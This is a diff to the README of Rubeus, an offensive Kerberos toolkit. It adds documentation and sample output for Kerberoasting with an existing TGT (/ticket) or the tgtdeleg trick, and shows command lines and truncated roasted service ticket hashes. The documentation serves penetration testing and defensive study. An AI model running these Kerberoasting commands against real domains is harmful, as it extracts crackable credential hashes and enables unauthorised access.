@@ -21,8 +21,8 @@ Rubeus is licensed under the BSD 3-Clause license.
     + [Opsec Notes](#opsec-notes)
       - [Overview](#overview)
       - [Weaponization](#weaponization)
-      - [Example: Credential Extraction](#example--credential-extraction)
-      - [Example: Over-pass-the-hash](#example--over-pass-the-hash)
+      - [Example: Credential Extraction](#example-credential-extraction)
+      - [Example: Over-pass-the-hash](#example-over-pass-the-hash)
   * [Ticket requests and renewals](#ticket-requests-and-renewals)
     + [asktgt](#asktgt)
     + [asktgs](#asktgs)
@@ -121,6 +121,12 @@ Rubeus is licensed under the BSD 3-Clause license.
 
         Perform Kerberoasting with alternate credentials:
             Rubeus.exe kerberoast /creduser:DOMAIN.FQDN\USER /credpassword:PASSWORD [/spn:"blah/blah"] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."]
+
+        Perform Kerberoasting with an existing TGT:
+            Rubeus.exe kerberoast /spn:"blah/blah" </ticket:BASE64 | /ticket:FILE.KIRBI>
+
+        Perform Kerberoasting using the tgtdeleg ticket to requestion service tickets:
+            Rubeus.exe kerberoast /spn:"blah/blah" /usetgtdeleg
 
         Perform AS-REP "roasting" for any users without preauth:
             Rubeus.exe asreproast [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."]
@@ -1524,7 +1530,11 @@ With no other arguments, all user accounts with SPNs set in the current domain a
 
 The `/outfile:FILE` argument outputs roasted hashes to the specified file, one per line.
 
-Also, if you wanted to use alternate domain credentials for kerberoasting, that can be specified with `/creduser:DOMAIN.FQDN\USER /credpassword:PASSWORD`.
+If the the TGT `/ticket:X` supplied (base64 encoding of a .kirbi file or the path to a .kirbi file on disk) that TGT is used to request the service service tickets during roasting. If `/ticket:X` is used with `/spn:Y` then no LDAP searching happens for users, so it can be done from a non-domain joined system in conjunction with `/dc:Z`.
+
+If the `/tgtdeleg` flag is supplied, the [tgtdeleg](#tgtdeleg) trick it used to get a usable TGT for the current user, which is then used for the roasting requests. If the default KerberosRequestorSecurityToken method fails, this is an alternative method.
+
+If you want to use alternate domain credentials for Kerberoasting (and searching for users to Kerberoast), they can be specified with `/creduser:DOMAIN.FQDN\USER /credpassword:PASSWORD`.
 
 Kerberoasting all users in the current domain:
 
@@ -1695,6 +1705,28 @@ Kerberoasting users in a foreign non-trusting domain using alternate credentials
     [*] ServicePrincipalName   : RestrictedKrbHost/server.external.local
     [*] Hash                   : $krb5tgs$23$*$external.local$RestrictedKrbHost/server.external.local@external.lo
                                 cal*$28F02F1AF08F9335C...(snip)...
+
+
+Kerberoasting using an existing TGT:
+
+    C:\Rubeus>Rubeus.exe kerberoast /ticket:doIFujCCBbagAwIBBaEDAgEWoo...(snip)... /spn:"asdf/asdfasdf" /dc:primary.testlab.local
+
+     ______        _
+    (_____ \      | |
+     _____) )_   _| |__  _____ _   _  ___
+    |  __  /| | | |  _ \| ___ | | | |/___)
+    | |  \ \| |_| | |_) ) ____| |_| |___ |
+    |_|   |_|____/|____/|_____)____/(___/
+
+    v1.3.5
+
+
+    [*] Action: Kerberoasting
+
+    [*] Using a TGT /ticket to request service tickets
+
+    [*] Target SPN             : asdf/asdfasdf
+    [*] Hash                   : $krb5tgs$23$*USER$DOMAIN$asdf/asdfasdf*$4EFF99FDED690AB4616EB...(snip)...
 
 
 ### asreproast
